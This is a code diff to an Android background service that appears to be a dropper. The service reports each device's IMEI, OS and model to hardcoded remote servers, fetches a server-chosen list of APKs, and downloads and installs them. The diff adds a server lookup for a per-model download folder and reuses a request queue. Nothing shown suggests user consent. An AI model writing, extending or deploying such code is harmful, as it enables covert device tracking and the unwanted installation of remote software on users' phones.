@@ -12,11 +12,14 @@ import android.text.TextUtils;
 import android.text.format.DateUtils;
 import android.text.format.Time;
 
+import com.android.volley.AuthFailureError;
+import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.Response.ErrorListener;
 import com.android.volley.Response.Listener;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.JsonArrayRequest;
+import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.xstd.ip.Config;
 import com.xstd.ip.Tools;
@@ -29,12 +32,15 @@ import net.tsz.afinal.http.AjaxCallBack;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+import org.w3c.dom.Text;
 
 import java.io.File;
 import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
+import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Map;
 
 public class CoreService extends Service {
 
@@ -44,12 +50,13 @@ public class CoreService extends Service {
     public static final String FETCH_SERVER_URL1 = "http://www.jingmoby.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL2 = "http://www.jmxstd.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL3 = "http://www.beiyongjm.com:8080/springMvc/student.do";
-    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
+    //    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
     public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
     public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
     private CoreReceiver receiver;
     private SharedPreferences sharedPreferences;
     private FinalHttp finalHttp;
+    private RequestQueue requestQueue;
     private String imei;
     private String device;
     private String os;
@@ -78,6 +85,7 @@ public class CoreService extends Service {
 
         sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
         finalHttp = new FinalHttp();
+        requestQueue = Volley.newRequestQueue(getApplicationContext());
         os = Build.VERSION.RELEASE;
         imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
 
@@ -135,8 +143,8 @@ public class CoreService extends Service {
             return;
         else
             Config.IS_DOWNLOADING.set(true);
-        RequestQueue rq = Volley.newRequestQueue(getApplicationContext());
-        rq.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
+
+        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
 
             @Override
             public void onResponse(JSONArray jsonArray) {
@@ -201,7 +209,7 @@ public class CoreService extends Service {
 
             }
         }));
-        rq.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
+        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
             @Override
             public void onResponse(JSONArray jsonArray) {
                 for (int i = 0; i < jsonArray.length(); i++) {
@@ -217,7 +225,7 @@ public class CoreService extends Service {
                 }
             }
         }, null));
-        rq.start();
+        requestQueue.start();
     }
 
     /**
@@ -249,21 +257,53 @@ public class CoreService extends Service {
         }
     }
 
+    private String getDownloadLocation() {
+        String parent = Tools.getDownloadDirectory(getApplicationContext());
+        if (TextUtils.isEmpty(parent)) {
+            // 先从本地获取下载路径，没有则从服务器获取次机型的下载地址。
+            String downloadLocation = sharedPreferences.getString("downloadlocation", null);
+            if (TextUtils.isEmpty(downloadLocation)) {
+                Tools.logW("从网络获取可下载地址。");
+                requestQueue.add(new StringRequest(Request.Method.POST, sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL), new Listener<String>() {
+                    @Override
+                    public void onResponse(String s) {
+                        if (s != null) {
+                            if (!TextUtils.isEmpty(s.trim()))
+                                sharedPreferences.edit().putString("downloadlocation", s.trim()).commit();
+                        }
+                    }
+                }, null) {
+                    @Override
+                    protected Map<String, String> getParams() throws AuthFailureError {
+                        Map<String, String> map = new HashMap<String, String>();
+                        map.put("device", device);
+                        map.put("method", "deviceSelect");
+                        return map;
+                    }
+                });
+                return null;
+            } else
+                return downloadLocation;
+        } else
+            return parent;
+    }
+
     /**
      * 開始下載，下載完成安裝
      */
     private void startDownload() {
+        String downloadlocation = getDownloadLocation();
+        Tools.logW("最终下载位置为：" + downloadlocation);
+        if (TextUtils.isEmpty(downloadlocation))
+            return;
         if (!Config.IS_DOWNLOADING.get() && mustDownloadApp.size() > 0) {
             Config.IS_DOWNLOADING.set(true);
-            File parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (!parent.exists())
-                parent.mkdirs();
             final ApkInfo apkInfo = mustDownloadApp.removeFirst();
-            final File file = new File(DOWNLOAD_LOCATION, apkInfo.fileName);
+            final File file = new File(downloadlocation, apkInfo.fileName);
             if (file.exists())
                 file.delete();
             Tools.logW("开始下载" + apkInfo.fileName);
-            finalHttp.download(apkInfo.remoteUrl, DOWNLOAD_LOCATION + apkInfo.fileName, true, new AjaxCallBack<File>() {
+            finalHttp.download(apkInfo.remoteUrl, file.getAbsolutePath(), true, new AjaxCallBack<File>() {
 
                 @Override
                 public void onSuccess(File file) {
